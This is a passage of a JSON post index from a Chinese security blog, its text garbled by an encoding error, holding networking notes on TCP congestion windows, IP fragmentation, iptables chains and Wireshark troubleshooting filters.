å­—èŠ‚)ï¼Œå˜æˆ 77480ã€‚å¦‚æœæ˜¯åœ¨æ…¢å¯åŠ¨é˜¶æ®µï¼Œé‚£å°±è¿œ è¿œä¸æ­¢è¿™ä¹ˆå¤§ã€‚ ç„¶è€Œå†çœ‹ä¸‹å›¾ï¼ŒWiresharkä¸­å´æ˜¾ç¤ºä¸‹ä¸€ä¸ªRTT(1974å·åŒ…)çš„cwndä¸º76215ã€‚ ä¹Ÿå°±æ˜¯è¯´ç»å†äº†ä¸€ä¸ª RTT ä¹‹åæ‰å¢åŠ äº† 195 ä¸ªå­—èŠ‚ï¼Œè¿œä¸å¦‚æˆ‘ä»¬æ‰€æœŸæœ›çš„ã€‚æˆ‘æ¥ ç€åˆå¾€ä¸‹çœ‹äº†å‡ ä¸ª RTTï¼Œè¿˜æ˜¯ä¸€æ ·çš„æƒ…å†µã€‚è¿™æ„å‘³ç€å®¢æˆ·ç«¯çš„å‘é€çª—å£å¢é•¿éå¸¸ æ…¢ï¼Œæ‰€ä»¥ä¼ è¾“æ•ˆç‡å°±å¾ˆä½ã€‚ cwndçš„ä¸€ç§è®¡ç®—æ–¹å¼ï¼š å‡å¦‚å®¢æˆ·ç«¯çš„å½“å‰ cwnd å¤§å°ä¸º n ä¸ª MSSï¼Œå®ƒå°±ä¼šåœ¨ä¸€ä¸ªçª—å£é‡Œå‘å‡ºå» n ä¸ªåŒ…ï¼Œç„¶åæœŸæœ›æ”¶åˆ° n ä¸ª Ackã€‚æ¯æ”¶åˆ° 1 ä¸ª Ack å®ƒå°±æŠŠ cwnd å¢åŠ â€œMSSMSS&#x2F;cwndâ€ï¼Œäºæ˜¯æ”¶åˆ° n ä¸ª Ack ä¹‹åå°±æ€»å…±å¢åŠ äº†â€œMSS(nMSS&#x2F;cwnd)â€ã€‚ç”±äº cwnd ç­‰äº n ä¸ª MSSï¼Œæ‰€ä»¥æ‹¬å· é‡Œçš„(nMSS&#x2F;cwnd)å¤§çº¦ç­‰äº 1ï¼Œä»è€Œå®ç°äº†æ¯ç»è¿‡ 1 ä¸ª RTT å°±å¢åŠ  1 ä¸ª MSS çš„ ç›®çš„ã€‚ æ‰€ä»¥æ˜¯cwndå¢é•¿è¿‡æ…¢å¯¼è‡´çš„ï¼Œå› ä¸ºåªæœ‰æ”¶åˆ°nä¸ªackåæ‰ä¼šæŒ‰ç…§é¢„æœŸçš„é€Ÿåº¦å¢é•¿ã€‚ä½†å¹¶éæ‰€æœ‰æœåŠ¡å™¨éƒ½æ˜¯æ”¶åˆ°nä¸ªæ•°æ®åŒ…å°±å›å¤nä¸ªackçš„ã€‚æœåŠ¡å™¨çš„ç½‘å¡ä¸Šå¯ç”¨äº† Large Receive Offload(LRO)ï¼Œ ä¼šç§¯ç´¯å¤šä¸ª TCP åŒ…å†é›†ä¸­å¤„ç†ï¼Œå› æ­¤ Ack æ•°å°±æ¯”åˆ«çš„æœåŠ¡å™¨å°‘å¾ˆå¤šï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆå…¶ä»–æœåŠ¡ å™¨æ²¡æœ‰æ€§èƒ½é—®é¢˜ã€‚åæ¥ç³»ç»Ÿç®¡ç†å‘˜ç”¨ ethtool å‘½ä»¤å…³é—­ LRO å°±æŠŠé—®é¢˜è§£å†³æ‰äº†ã€‚ é”™è¯¯ä½¿ç”¨UDPåè®®ä¼ è¾“UDPæ—¶ä¸å¯é ä¼ è¾“ï¼Œå®ƒç¼ºä¹ä¸€ä¸ªæœºåˆ¶ç¡®ä¿æ•°æ®å®‰å…¨é€è¾¾ã€‚å®ƒä¸èƒ½æŠŠå¤§æ•°æ®å—å…ˆè¿›è¡Œåˆ†æ®µï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“è¢«ç½‘ç»œå±‚åˆ†ç‰‡ï¼Œä½†ä¸€ä¸ªåˆ†ç‰‡çš„ä¸¢å¤±ï¼Œä¼šå¯¼è‡´æ‰€æœ‰åˆ†ç‰‡éƒ½è¢«é‡ä¼ ä¸€éï¼Œæ•ˆç‡æä½ã€‚æ‰€ä»¥åœ¨ä¼ è¾“å¤§æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨TCPæ¥è¿›è¡Œä¼ è¾“ã€‚ å…³äºåˆ†ç‰‡çš„å‡ ä¸ªé—®é¢˜Question1ï¼šä¸ºä»€ä¹ˆè¦åˆ†ç‰‡ Answer1ï¼šç”±äºç”µè·¯äº¤æ¢çš„åŒæ–¹è¦ç‹¬å é“¾è·¯ï¼Œæ‰€ä»¥åˆ©ç”¨ç‡å¾ˆä½ï¼Œç›´åˆ°åæ¥å‘æ˜äº†åˆ†ç»„äº¤æ¢çš„æ¦‚å¿µï¼ŒæŠŠæ•°æ®åˆ†å‰²æˆå°åŒ…åæ‰å®ç°äº†é“¾è·¯å…±äº«ã€‚ç°åœ¨çš„ä»¥å¤ªç½‘ä¸­ï¼Œä»¥1500å­—èŠ‚ä½œä¸ºæœ€å¤§ä¼ è¾“å•ä½ï¼Œå³MTU&#x3D;1500ã€‚åˆ¨å» 20 å­—èŠ‚çš„å¤´éƒ¨ï¼Œä¸€ä¸ª IP åŒ…æœ€å¤šå¯ä»¥æºå¸¦ 1500-20&#x3D;1480 å­—èŠ‚ çš„æ•°æ®ã€‚å½“è¦ä¼ è¾“çš„æ•°æ®å—è¶…è¿‡ 1480 å­—èŠ‚æ—¶ï¼Œç½‘ç»œå±‚å°±ä¸å¾—ä¸æŠŠå®ƒåˆ†ç‰‡ï¼Œå°è£…æˆå¤šä¸ªç½‘ç»œåŒ…ã€‚ Question2ï¼šå‘é€æ–¹æ˜¯æ€æ ·ç¡®å®šåˆ†ç‰‡å¤§å°çš„ï¼Ÿ Answer2ï¼šä¸€èˆ¬æ¥è¯´ï¼Œå‘é€æ–¹æ˜¯ä¾æ®è‡ªèº«çš„MTUæ¥å†³å®šåˆ†ç‰‡å¤§å°çš„ã€‚æ€»è€Œè¨€ä¹‹ï¼Œç›®å‰å‘é€æ–¹æ²¡æœ‰ä¸€ä¸ªå¾ˆå¥½çš„æœºåˆ¶æ¥ç¡®å®šæœ€ä½³åˆ†ç‰‡å¤§å°ï¼Œæ‰€ä»¥å®æ–½å’Œè¿ç»´äººå‘˜é…ç½®MTUæ—¶å¿…é¡»è°¨æ…ï¼Œå°½é‡ä½¿ç½‘ç»œä¸­æ¯ä¸ªè®¾å¤‡çš„MTUä¿æŒä¸€è‡´ Question3ï¼šæ¥æ”¶æ–¹åˆæ˜¯é ä»€ä¹ˆé‡ç»„åˆ†ç‰‡çš„ï¼Ÿ Answer 3 ï¼šä¾æ®offï¼ˆåç§»é‡ï¼‰å’ŒIDä¸¤ä¸ªå€¼ã€‚æŠŠIDç›¸åŒçš„åˆ†ç‰‡ï¼ŒæŒ‰ç…§offï¼ˆåç§»é‡ï¼‰è¿›è¡Œé‡ç»„ã€‚å½“æ”¶åˆ°ä¸€ä¸ªåŒ…ï¼Œå®ƒåŒ…å«more fragments = 0çš„flagï¼Œåˆ™è¡¨ç¤ºå®ƒæ˜¯æœ€åä¸€ä¸ªåˆ†ç‰‡ï¼Œæ¥æ”¶æ–¹å¯ä»¥å¼€å§‹é‡ç»„äº†ã€‚ Question 4 ï¼šTCPæ˜¯å¦‚ä½•é¿å…è¢«å‘é€æ–¹åˆ†ç‰‡çš„ï¼Ÿ Answer 4 ï¼šTCPå¯ä»¥é¿å…è¢«å‘é€æ–¹åˆ†ç‰‡ï¼Œæ˜¯å› ä¸ºå®ƒä¸»åŠ¨æŠŠæ•°æ®åˆ†æˆå°æ®µå†äº¤ç»™ç½‘ç»œå±‚ã€‚æœ€å¤§çš„åˆ†æ®µå¤§å°ç§°ä¸ºMSSï¼Œå®ƒç›¸å½“äºæŠŠMTUé™¤å»IPå¤´å’ŒTCPå¤´ä¹‹åçš„å¤§å°ï¼Œæ‰€ä»¥ä¸€ä¸ªMSSæ°å¥½èƒ½è£…è¿›ä¸€ä¸ªMTUä¸­ã€‚ UDPåˆ™æ²¡æœ‰MSSçš„æ¦‚å¿µï¼Œä¸€è‚¡è„‘äº¤ç»™ç½‘ç»œå±‚ï¼Œæ‰€ä»¥å¯èƒ½è¢«åˆ†ç‰‡ã€‚åˆ†ç‰‡å’Œé‡ç»„éƒ½ä¼šå½±å“æ€§èƒ½ï¼Œæ‰€ä»¥UDPåœ¨è¿™ä¸€ç‚¹ä¸Šæ¯”TCPè½åä¸€äº›ã€‚ Question 5 ï¼šTCPæ˜¯æ€æ ·é€‚é…æ¥æ”¶æ–¹çš„MTUçš„ Answer 5 ï¼š TCPå»ºç«‹è¿æ¥æ—¶å¿…é¡»å…ˆè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œåœ¨å‰ä¸¤ä¸ªæ¡æ‰‹åŒ…ä¸­åŒæ–¹äº’ç›¸å£°æ˜äº†è‡ªå·±çš„MSS","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æµé‡åˆ†æ","slug":"Webå®‰å…¨/æµé‡åˆ†æ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://gryffinbit.top/tags/wireshark/"}],"author":"Gryffinbit"},{"title":"iptablesä»‹ç»","slug":"iptablesä»‹ç»","date":"2022-07-14T13:41:49.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/07/14/iptablesä»‹ç»/","permalink":"https://gryffinbit.top/2022/07/14/iptables%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"ç®€ä»‹Linuxä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ã€‚å¯ä»¥å®Œæˆå°åŒ…è¿‡æ»¤ã€å°åŒ…é‡å®šå‘å’Œç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ç­‰åŠŸèƒ½ã€‚ è§„åˆ™ è§„åˆ™å®šä¹‰ä¸ºï¼šå¦‚æœæ•°æ®åŒ…å¤´ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ï¼Œå°±è¿™æ ·å¤„ç†è¿™ä¸ªæ•°æ®åŒ…ã€‚ è§„åˆ™å­˜å‚¨åœ¨å†…æ ¸ç©ºé—´çš„ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­ã€‚è¿™äº›è§„åˆ™åˆ†åˆ«æŒ‡å®šäº†æºåœ°å€ã€ç›®çš„åœ°å€ã€ä¼ è¾“åè®®å’ŒæœåŠ¡ç±»å‹ç­‰ã€‚ç­‰æ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ—¶ï¼Œiptableså°±æ ¹æ®è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•æ¥å¤„ç†æ•°æ®åŒ…ï¼šacceptã€rejectã€drop iptablesæ˜¯Linuxé˜²ç«å¢™çš„ç®¡ç†å·¥å…·ï¼Œä½äºsbin/iptablesï¼Œå®ç°é˜²ç«å¢™åŠŸèƒ½çš„æ˜¯netfilterï¼Œå®ƒæ˜¯Linuxå†…æ ¸ä¸­å®ç°åŒ…è¿‡æ»¤çš„å†…éƒ¨ç»“æ„ã€‚ iptablesä¼ è¾“æ•°æ®åŒ…çš„è¿‡ç¨‹ æ•°æ®åŒ…è¿›å…¥ç½‘å¡ï¼Œè¿›å…¥preroutingé“¾ï¼Œæ ¹æ®æ•°æ®åŒ…ç›®çš„ipã€åˆ¤æ–­æ˜¯å¦éœ€è¦ä¼ é€å‡ºå»ã€‘ æ•°æ®åŒ…æ˜¯è¿›å…¥æœ¬æœºçš„ï¼Œåˆ°è¾¾inputé“¾ã€‚åˆ°è¾¾inputé“¾åï¼Œä»»ä½•è¿›ç¨‹éƒ½ä¼šæ”¶åˆ°å®ƒã€‚ã€æœ¬æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥å‘é€æ•°æ®åŒ…ã€‘ï¼Œè¿™äº›æ•°æ®åŒ…ä¼šç»è¿‡outputé“¾ï¼Œã€åˆ°è¾¾postroutingé“¾è¾“å‡ºã€‘ã€‘ æ•°æ®åŒ…å¦‚æœæ˜¯è¦è½¬å‘ï¼Œä¼šç»è¿‡forwardé“¾ï¼Œåˆ°è¾¾postroutingé“¾è¾“å‡ºã€‚ iptablesçš„è§„åˆ™è¡¨å’Œé“¾å››ä¸ªå†…ç½®è¡¨ï¼šfilterï¼ˆåŒ…è¿‡æ»¤ï¼‰ã€natï¼ˆç½‘è·¯åœ°å€è½¬æ¢ï¼‰ã€mangleï¼ˆåŒ…é‡æ„ã€ä¿®æ”¹ï¼‰ã€rawï¼ˆæ•°æ®è·Ÿè¸ªå¤„ç†ï¼‰ è¡¨çš„ä¼˜å…ˆé¡ºåº: raw &gt; mangle &gt; nat &gt; filter é“¾ï¼šæ•°æ®åŒ…ä¼ æ’­çš„è·¯å¾„ï¼Œæ¯ä¸€æ¡é“¾å°±æ˜¯ä¼—å¤šè§„åˆ™ä¸­çš„ä¸€ä¸ªæ£€æµ‹æ¸…å•ã€‚æ¯ä¸€æ¡é“¾ä¸­å¯ä»¥æœ‰ä¸€æ¡æˆ–æ•°æ¡è§„åˆ™ã€‚å½“ä¸€ä¸ªæ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªé“¾æ—¶ï¼Œiptableså°±ä¼šä»é“¾ä¸­ç¬¬ä¸€æ¡è§„åˆ™å¼€å§‹æ£€æŸ¥ã€‚æ»¡è¶³ï¼Œåˆ™æŒ‰è§„å®šå®šä¹‰çš„æ–¹æ³•å¤„ç†åŒ…ã€‚ä¸æ»¡è¶³å°±æ£€æŸ¥ä¸‹ä¸€æ¡è§„åˆ™ã€‚å¦‚æœæ•°æ®åŒ…ä¸æ»¡è¶³é“¾ä¸­ä»»ä½•ä¸€æ¡è§„åˆ™ï¼Œåˆ™ä¼šæ ¹æ®é¢„å®šä¹‰çš„é»˜è®¤è§„åˆ™å¤„ç†ã€‚ è¡¨å¯¹åº”çš„é“¾ï¼š filterè¡¨ï¼šinputé“¾ã€forwardé“¾ã€outputé“¾ã€‚ â€‹ ä½œç”¨è¿‡æ»¤æ•°æ®åŒ…ã€‚å†…æ ¸æ¨¡å—ï¼šiptables_filter NATè¡¨ï¼špreroutingé“¾ã€postroutingé“¾ã€outputé“¾ â€‹ ä½œç”¨ï¼šç½‘ç»œåœ°å€è½¬æ¢ï¼ˆIPã€ç«¯å£ï¼‰ã€‚å†…æ ¸æ¨¡å—ï¼šiptable_nat mangleè¡¨ï¼špreroutingã€postroutingã€inputã€outputã€forward â€‹ ä½œç”¨ï¼šä¿®æ”¹æ•°æ®åŒ…çš„æœåŠ¡ç±»å‹ã€TTLã€å¹¶ä¸”å¯ä»¥é…ç½®è·¯ç”±å®ç°QOSï¼ˆæœåŠ¡è´¨é‡ï¼Œç½‘ç»œä¸ºç‰¹å®šæµé‡æä¾›æ›´é«˜ä¼˜å…ˆæœåŠ¡çš„åŒæ—¶æ§åˆ¶æŠ–åŠ¨å’Œå»¶è¿Ÿçš„èƒ½åŠ›ï¼Œå¹¶ä¸”èƒ½å¤Ÿé™ä½æ•°æ®ä¼ è¾“ä¸¢åŒ…ç‡ï¼‰ã€‚ å†…æ ¸æ¨¡å—ï¼šiptable_mangle rawè¡¨ï¼šoutputã€prerouting â€‹ ä½œç”¨ï¼šå†³å®šæ•°æ®åŒ…æ˜¯å¦è¢«çŠ¶æ€è·Ÿè¸ªæœºåˆ¶å¤„ç†ã€‚ å†…æ ¸æ¨¡å—: iptable_raw è§„åˆ™é“¾1.INPUTâ€”â€”è¿›æ¥çš„æ•°æ®åŒ…åº”ç”¨æ­¤è§„åˆ™é“¾ä¸­çš„ç­–ç•¥ 2.OUTPUTâ€”â€”å¤–å‡ºçš„æ•°æ®åŒ…åº”ç”¨æ­¤è§„åˆ™é“¾ä¸­çš„ç­–ç•¥ 3.FORWARDâ€”â€”è½¬å‘æ•°æ®åŒ…æ—¶åº”ç”¨æ­¤è§„åˆ™é“¾ä¸­çš„ç­–ç•¥ 4.PREROUTINGâ€”â€”å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©å‰åº”ç”¨æ­¤é“¾ä¸­çš„è§„åˆ™ ï¼ˆè®°ä½ï¼æ‰€æœ‰çš„æ•°æ®åŒ…è¿›æ¥çš„æ—¶ä¾¯éƒ½å…ˆç”±è¿™ä¸ªé“¾å¤„ç†ï¼‰ 5.POSTROUTINGâ€”â€”å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©ååº”ç”¨æ­¤é“¾ä¸­çš„è§„åˆ™ ï¼ˆæ‰€æœ‰çš„æ•°æ®åŒ…å‡ºæ¥çš„æ—¶ä¾¯éƒ½å…ˆç”±è¿™ä¸ªé“¾å¤„ç†ï¼‰ æ•°æ®æµå‘å…¥ç«™æ•°æ®æµå‘ å…ˆè¢«preroutingè§„åˆ™é“¾å¤„ç†ã€ç„¶åè·¯ç”±é€‰æ‹©ã€‚ æ•°æ®åŒ…ç›®æ ‡ä¸»æœºæ˜¯é˜²ç«å¢™æœ¬æœºï¼Œåˆ™ä¼ ç»™inputé“¾å¤„ç†ã€‚ï¼ˆæ¯”å¦‚ç½‘ç»œç”¨æˆ·è®¿é—®é˜²ç«å¢™ä¸»æœºä¸­çš„webæœåŠ¡ï¼‰ é€šè¿‡åï¼Œäº¤ç»™ç³»ç»Ÿä¸Šå±‚åº”ç”¨ç¨‹åºè¿›è¡Œå“åº”ï¼ˆæ¯”å¦‚äº¤ç»™apacheæœåŠ¡å™¨ï¼‰ è½¬å‘æ•°æ®æµå‘ å…ˆè¢«preroutingè§„åˆ™é“¾å¤„ç†ã€ç„¶åè·¯ç”±é€‰æ‹©ã€‚ æ•°æ®åŒ…ç›®æ ‡åœ°å€æ˜¯å…¶ä»–å¤–éƒ¨ç½‘ç»œï¼Œåˆ™ä¼ ç»™forwardé“¾å¤„ç†ï¼ˆæ¯”å¦‚å±€åŸŸç½‘ç”¨æˆ·é€šè¿‡ç½‘å…³è®¿é—®QQç«™ç‚¹çš„æ•°æ®åŒ…ï¼‰ï¼ˆå¤„ç†ï¼šè½¬å‘æˆ–æ‹¦æˆªï¼‰ äº¤ç»™postroutingè§„åˆ™é“¾ï¼Œè¿›è¡Œå¤„ç†ï¼ˆæ˜¯å¦ä¿®æ”¹æ•°æ®åŒ…çš„åœ°å€ç­‰ï¼‰ å‡ºç«™æ•°æ®æµå‘ é˜²ç«å¢™æœ¬æœºå‘å¤–éƒ¨åœ°å€å‘æ•°æ®åŒ…ï¼Œå…ˆè¢«outputé“¾å¤„ç†ï¼ˆæ¯”å¦‚é˜²ç«å¢™ä¸»æœºæµ‹è¯•å…¬ç½‘DNSæœåŠ¡å™¨æ—¶ï¼‰ ç„¶åè·¯ç”±é€‰æ‹© æœ€åä¼ é€’ç»™postroutingé“¾ å‚è€ƒæ–‡ç« iptablesè¯¦è§£ä»¥åŠå¸¸ç”¨è§„åˆ™","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"wiresharkç½‘ç»œåˆ†æçš„è‰ºæœ¯ç¬”è®°ã€ç­”è¯»è€…é—®ã€‘","slug":"wiresharkç½‘ç»œåˆ†æçš„è‰ºæœ¯ç¬”è®°ã€ç­”è¯»è€…é—®ã€‘","date":"2022-07-13T22:22:07.000Z","updated":"2024-11-12T06:59:02.000Z","comments":true,"path":"2022/07/14/wiresharkç½‘ç»œåˆ†æçš„è‰ºæœ¯ç¬”è®°ã€ç­”è¯»è€…é—®ã€‘/","permalink":"https://gryffinbit.top/2022/07/14/wireshark%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E7%9A%84%E8%89%BA%E6%9C%AF%E7%AC%94%E8%AE%B0%E3%80%90%E7%AD%94%E8%AF%BB%E8%80%85%E9%97%AE%E3%80%91/","excerpt":"","text":"Linuxä¸ºä»€ä¹ˆå¡ä½äº†Questionï¼šæœ‰æ—¶é€šè¿‡SSH ç™»å½• Linux æœåŠ¡å™¨æ—¶ï¼Œè¾“å®Œç”¨æˆ·åå°±å¡ä½äº†ï¼Œè¦ç­‰å¾…10ç§’é’Ÿæ‰æç¤ºå¯†ç è¾“å…¥ã€‚ Answerï¼šLinux æœåŠ¡å™¨åœ¨æ”¶åˆ° SSH è®¿é—®è¯·æ±‚æ—¶ï¼Œä¼šå…ˆæŸ¥è¯¢è¯¥å®¢æˆ·ç«¯ IP æ‰€å¯¹åº”çš„ PTR è®°å½•ã€‚å‡å¦‚ç»è¿‡ 5 ç§’é’Ÿè¿˜æ²¡æœ‰æ”¶åˆ°å›å¤ï¼Œå°±å†å‘ä¸€æ¬¡æŸ¥è¯¢ã€‚å¦‚æœç¬¬äºŒæ¬¡æŸ¥è¯¢è¿˜æ˜¯ç­‰äº† 5 ç§’è¿˜æ²¡å¤ï¼Œå°±å½»åº•æ”¾å¼ƒæŸ¥è¯¢ã€‚å¦‚æœDNS æŸ¥è¯¢èƒ½æˆåŠŸï¼Œå°±ä¸ç”¨ç™½ç­‰é‚£10 ç§’é’Ÿäº†ã€‚ PTRè®°å½•ï¼šåŸŸåç³»ç»Ÿ (DNS) å°†åŸŸåä¸ IP åœ°å€ç›¸å…³è”ã€‚DNS æŒ‡é’ˆè®°å½•ï¼ˆç®€ç§° PTRï¼‰æä¾›ä¸ IP åœ°å€å…³è”çš„åŸŸåã€‚DNS PTR è®°å½•ä¸â€œAâ€è®°å½•å®Œå…¨ç›¸åï¼Œå®ƒæä¾›ä¸åŸŸåå…³è”çš„ IP åœ°å€ã€‚DNS PTR è®°å½•ç”¨äºåå‘ DNS æŸ¥æ‰¾ã€‚å½“ç”¨æˆ·å°è¯•åœ¨å…¶æµè§ˆå™¨ä¸­è®¿é—®åŸŸåæ—¶ï¼Œä¼šè¿›è¡Œ DNS æŸ¥æ‰¾ï¼Œå°†åŸŸåä¸ IP åœ°å€ç›¸åŒ¹é…ã€‚åå‘ DNS æŸ¥æ‰¾ä¸æ­¤è¿‡ç¨‹ç›¸åï¼šå®ƒæ˜¯ä»¥ IP åœ°å€å¼€å§‹å¹¶æŸ¥æ‰¾åŸŸåçš„æŸ¥è¯¢ã€‚ Solutionï¼šé’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œè§£å†³æ–¹æ³•æ˜¯æ›´æ”¹sshé…ç½®æ–‡ä»¶ï¼Œå°†UseDNSé…ç½®é¡¹å…³é—­ï¼ˆUseDNS noï¼‰ VMwareä¼˜åŒ–å­˜å‚¨é˜µåˆ—å’Œè¯»å†™æ€§èƒ½Questionï¼šæŸäº›iSCSI å­˜å‚¨é˜µåˆ—åœ¨å‡ºç°ç½‘ç»œæ‹¥å¡æ—¶å¤„ç†ä¸å½“ï¼Œä¼šä¸¥é‡å½±å“VMware çš„è¯»å†™æ€§èƒ½ Answerï¼šè¿™å’Œå®ƒä»¬çš„TCP å®ç°æ–¹å¼æœ‰å…³ã€‚å»¶è¿Ÿç¡®è®¤ä¼šåœ¨æ”¶åˆ°æ•°æ®åŒ…æ—¶ï¼Œä¸ç›´æ¥å‘å‡ºç¡®è®¤åŒ…è€Œæ˜¯ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå¹¶ä¸”å°†è¿™æ®µæ—¶é—´çš„ç¡®è®¤åŒ…ä½œä¸ºæå¸¦ç¡®è®¤æ•°æ®ä¸€å¹¶å‘é€ã€‚è¿™æ ·çš„è¯ï¼Œä¾¿å°†åŸæ¥å¤šä¸ªæ•°æ®åŒ…åˆå¹¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…å‘é€äº†ï¼Œå‡å°‘äº†æ•°æ®åŒ…çš„å‘é€ï¼ŒèŠ‚çœäº†æ•°æ®åŒ…æ•°é‡ã€‚ä½†å¦‚æœå¤šä¸ªå»¶è¿Ÿç¡®è®¤æ‹¥å¡åœ¨ä¸€èµ·ï¼Œå°±ä¼šå‡ºç°è¾ƒé•¿ç­‰å¾…æ—¶é—´ï¼Œå½±å“æ€§èƒ½ã€‚ SCSIæ˜¯å°å‹è®¡ç®—æœºç³»ç»Ÿæ¥å£(Small Computer System Interface)çš„ç®€ç§°ï¼ŒSCSIä½œä¸ºè¾“å…¥&#x2F;è¾“å‡ºæ¥å£ï¼Œä¸»è¦ç”¨äºç¡¬ç›˜ã€å…‰ç›˜ã€ç£å¸¦æœºã€æ‰«æä»ªã€æ‰“å°æœºç­‰è®¾å¤‡ã€‚iSCSIå°±æ˜¯åœ¨IPç½‘ç»œä¸Šè¿è¡ŒSCSIåè®®çš„ä¸€ç§ç½‘ç»œå­˜å‚¨æŠ€æœ¯ Solutionï¼šVMwareé€šè¿‡å…³é—­å»¶è¿Ÿç¡®è®¤ï¼Œå¯ä»¥ä¼˜åŒ–ISCSIå­˜å‚¨é˜µåˆ—å’ŒVMwareçš„è¯»å†™æ€§èƒ½ã€‚ wiresharkä¸­ä¸‰æ¬¡æ¡æ‰‹ wiresharkä¸­ï¼Œåœ¨Edit/Preferences/Protocols/TCP èœå•ä¸­å‹¾ä¸Š Relative Sequence Numbers ï¼Œä»¥æ­¤æ¥å¯ç”¨åºå·ç›¸å¯¹å€¼ï¼Œä¾¿äºè§‚å¯ŸTCPä¸‰æ¬¡æ¡æ‰‹æ—¶éœ€è¦çš„Seqå€¼å’ŒACKå€¼ã€‚ æˆåŠŸçš„æ¡æ‰‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¤±è´¥çš„æ¡æ‰‹å´å„æœ‰ä¸åŒï¼Œå› æ­¤è§£å†³èµ·æ¥è¿˜æ˜¯éœ€è¦ä¸€ äº›æŠ€å·§çš„ã€‚æ¡æ‰‹å¤±è´¥ä¸€èˆ¬åˆ†ä¸¤ç§ç±»å‹ï¼Œè¦ä¹ˆè¢«æ‹’ç»ï¼Œè¦ä¹ˆæ˜¯ä¸¢åŒ…äº†ã€‚ä½œè€…æåˆ°ä½¿ç”¨ä¸‹é¢ä¸¤ä¸ªè¿‡æ»¤è¡¨è¾¾å¼ä¾¿å¯ä»¥å®šä½å‡ºå¤§å¤šæ•°æ¡æ‰‹å¤±è´¥çš„æ•°æ®åŒ…ï¼š è¡¨è¾¾å¼ 1ï¼š(tcp.flags.reset == 1) &amp;&amp; (tcp.seq == 1)ï¼Œè¡¨ç¤ºæ¡æ‰‹è¯·æ±‚è¢«å¯¹æ–¹æ‹’ç»äº†ã€‚ è¡¨é¢ä¸Šçœ‹ï¼Œå…¶åªæ˜¯è¿‡æ»¤å‡º Seq å·ä¸º 1ï¼Œä¸”å«æœ‰ Reset æ ‡å¿—çš„åŒ…ã€‚ä½†åœ¨å¯ç”¨Relative Sequence Numbers çš„æƒ…å†µä¸‹ï¼Œè¿™å¾€å¾€è¡¨ç¤ºæ¡æ‰‹è¯·æ±‚è¢«å¯¹æ–¹æ‹’ç»äº†ã€‚æ¥ä¸‹æ¥åªéœ€å³é”®é€‰ä¸­è¿‡æ»¤å‡ºçš„åŒ…ï¼Œå†ç‚¹å‡»Follow TCP Stream å°±å¯ä»¥æŠŠå¤±è´¥çš„å…¨è¿‡ç¨‹æ˜¾ç¤ºå‡ºæ¥ã€‚ è¡¨è¾¾å¼ 2ï¼š(tcp.flags.syn == 1) &amp;&amp; (tcp.analysis.retransmission)ï¼Œå¯è¿‡æ»¤å‡ºé‡ä¼ çš„æ¡æ‰‹è¯·æ±‚ã€‚ ä¸€ä¸ªæ¡æ‰‹è¯·æ±‚ä¹‹æ‰€ä»¥è¦é‡ä¼ ï¼Œå¾€å¾€æ˜¯å› ä¸ºå¯¹æ–¹æ²¡æ”¶åˆ°ï¼Œæˆ–è€…å¯¹æ–¹å›å¤çš„ç¡®è®¤åŒ…ä¸¢å¤±äº†ã€‚è¿‡æ»¤ä¹‹åï¼Œå†å³é”®ç‚¹å‡»è¿‡æ»¤å‡ºçš„åŒ…ï¼Œå†ç”¨Follow TCP Stream å°±å¯ä»¥æŠŠå¤±è´¥è¿‡ç¨‹æ˜¾ç¤ºå‡ºæ¥ã€‚ ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼š å®¢æˆ·ç«¯å‘é€SYNï¼Œè¯·æ±‚å»ºç«‹è¿æ¥ã€SYN&#x3D;1ï¼ŒACK&#x3D;0ã€‘ æœåŠ¡å™¨ç«¯æ”¶åˆ°SYNï¼Œå‘é€ACKç¡®è®¤ï¼ŒåŒæ—¶è‡ªå·±å‘é€ä¸€ä¸ªSYNã€SYN&#x3D;1ï¼ŒACK&#x3D;1ã€‘ å®¢æˆ·ç«¯æ”¶åˆ°ACK+SYNï¼Œå›å¤ACKç¡®è®¤ï¼Œè¿æ¥å»ºç«‹å®Œæˆã€SYN&#x3D;0ï¼ŒACK&#x3D;1ã€‘ å››æ¬¡æ¡æ‰‹æ–­å¼€è¿æ¥ï¼š å®¢æˆ·ç«¯å‘é€FINï¼Œè¯·æ±‚é‡Šæ”¾è¿æ¥ã€FINã€‘ æœåŠ¡å™¨ç«¯æ”¶åˆ°FINï¼Œå‘é€ACKç¡®è®¤ã€ACKã€‘ 